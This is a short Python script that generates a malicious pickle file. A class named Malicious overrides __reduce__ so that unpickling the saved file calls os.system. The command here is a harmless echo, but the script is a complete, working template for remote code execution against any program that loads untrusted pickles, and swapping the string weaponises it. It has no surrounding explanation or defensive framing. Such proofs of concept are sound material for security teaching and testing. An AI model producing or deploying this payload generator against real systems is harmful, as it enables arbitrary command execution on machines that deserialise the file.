import os
import pickle

class Malicious:
    def __reduce__(self):
        return (os.system, ('echo "Malicious payload executed!"',))

if __name__ == "__main__":
    payload = pickle.dumps(Malicious())
    print("Malicious pickle payload generated.")
    with open("malicious.pkl", "wb") as f:
        f.write(payload)
